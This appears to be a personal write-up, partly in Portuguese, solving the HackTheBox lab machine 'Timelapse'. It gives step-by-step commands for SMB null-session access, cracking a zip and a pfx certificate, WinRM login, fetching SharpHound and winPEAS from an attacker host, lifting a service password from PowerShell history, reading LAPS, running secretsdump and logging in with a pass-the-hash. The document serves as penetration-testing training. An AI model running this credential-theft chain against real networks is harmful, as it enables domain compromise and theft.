Timelapse
========================

## Enumeration

    sudo nmap_enum timelapse.htb | tee nmap_output.txt

![qownnotes-media-FvFesF](../../../media/qownnotes-media-FvFesF.png)

    sudo nmap -p- -Pn -T5 -n timelapse.htb | tee nmap_fullportstcp_output.txt

![qownnotes-media-hKZpit](../../../media/qownnotes-media-hKZpit.png)

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn timelapse.htb | tee nmap_udp_output.txt

 ![qownnotes-media-RpqeyD](../../../media/qownnotes-media-RpqeyD.png)

    crackmapexec smb timelapse.htb
 
 ![qownnotes-media-THDfQf](../../../media/qownnotes-media-THDfQf.png)

    dnsenum -dnsserver 10.10.11.152 timelapse.htb
    
    
    dig axfr timelapse.htb @10.10.11.152
    
    dnsrecon -d timelapse.htb -n 10.10.11.152
    
 ![qownnotes-media-LdhbrU](../../../media/qownnotes-media-LdhbrU.png)


## Exploitation


Null session do smbclient

    smbclient //timelapse.htb/Shares
    dir
    cd Dev
    dir
    get winrm_backup.zip

Obtendo arquivo cujo conteúdo era o certificado para acessar a máquina via winrm.

![qownnotes-media-JYheJk](../../../media/qownnotes-media-JYheJk.png)


```
$ cat zip_cracker.py
import zipfile 
import sys
 
filename = sys.argv[2] 
dictionary = sys.argv[1] 
 
password = None 
file_to_open = zipfile.ZipFile(filename) 
with open(dictionary, 'r') as f: 
   for line in f.readlines(): 
         password = line.strip('\n') 
         try: 
               file_to_open.extractall(pwd=password) 
               password = 'Password found: %s' % password 
               print password 
         except: 
               pass 

$ python2 zip_cracker.py /usr/share/wordlists/rockyou.txt winrm_backup.zip
```
Another way:

```
zip2john winrm_backup.zip > text.txt
john --format=pkzip -w /usr/share/wordlists/rockyou.txt text.txt
unzip winrm_backup.zip
<supremelegacy>
pfx2john legacyy_dev_auth.pfx > text2.txt
john --format=pfx -w /usr/share/wordlists/rockyou.txt text2.txt

```
![qownnotes-media-KEWgXQ](../../../media/qownnotes-media-KEWgXQ.png)
![qownnotes-media-SGKHnH](../../../media/qownnotes-media-SGKHnH.png)

Uma vez obtido o certificado, era necessário gerar duas informações, uma chave privada e uma pública com os comandos abaixo:

    openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
    openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes

Dessa forma a gente conseguia acesso na máquina via evil-winrm

    evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S -r timelapse.htb
ref: <https://wadcoms.github.io/wadcoms/Evil-Winrm-PKINIT/>
![qownnotes-media-lDuOTK](../../../media/qownnotes-media-lDuOTK.png)


## Privilege Escalation

Aqui eu fui fazer a enumeração para realizar a escalação de privilégio. Começando com bloodhound:

    wget http://10.10.14.10/SharpHound.exe -o sh.exe
    ./sh.exe
    mv 20231110164932_BloodHound.zip bh.zip
    download bh.zip

![qownnotes-media-qMxsCK](../../../media/qownnotes-media-qMxsCK.png)

    neo4j console
    <CTRL + Z>
    bg
    bloodhound

Arrastei o arquivo para o blodhound o que deu uma visão interessante a respeito do domínio:

![qownnotes-media-BydjMv](../../../media/qownnotes-media-BydjMv.png)



Nesse caso começou a ficar interessante, porque o usuário encontrado 


A máquina tinha o DCSync (impacket-secretsdump) no domínio. Então notei que esse seria o caminho para comprometer, no entanto seria necessário subir privilégio nela primeiro. Então comecei com o WinoPeas:

    wget http://10.10.14.10/4-privilege%20escalation/winPEASx64.exe -o wp.exe
    ./wp.exe


![qownnotes-media-GOrJaW](../../../media/qownnotes-media-GOrJaW.png)

![qownnotes-media-bvznRl](../../../media/qownnotes-media-bvznRl.png)

Encontrei no histórico do powershell infos importantes para lateralizar:


    type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    whoami
    ipconfig /all
    netstat -ano |select-string LIST
    $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
    $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
    $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
    invoke-command -computername localhost -credential $c -port 5986 -usessl -
    SessionOption $so -scriptblock {whoami}
    get-aduser -filter * -properties *
    exit

![qownnotes-media-FKBEgW](../../../media/qownnotes-media-FKBEgW.png)


    net user /domain svc_deploy
        
![qownnotes-media-gkJwFL](../../../media/qownnotes-media-gkJwFL.png)

Então notei que esse usário obtido no histórico do powershell tinha permissão para fazer a leitura das senhas do LAPS, que pode ser feito da seguinte forma:

    crackmapexec ldap 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps

ref: <https://exploit-notes.hdks.org/exploit/windows/active-directory/laps-pentesting/>
<https://www.hackingarticles.in/credential-dumpinglaps/>

![qownnotes-media-KpNAvb](../../../media/qownnotes-media-KpNAvb.png)

    impacket-secretsdump 'Administrator:B.o8F,yh;Pk/8x8}XdJZ5#7z@10.10.11.152'

![qownnotes-media-RVobil](../../../media/qownnotes-media-RVobil.png)


    
    impacket-wmiexec Administrator@10.10.11.152 -hashes aad3b435b51404eeaad3b435b51404ee:0adb371257d970bb1f28fda2c2f8eecc
    
 Já na máquina da vítima foi só fazer o seguinte:
 
     cd C:/
     dir /s root.txt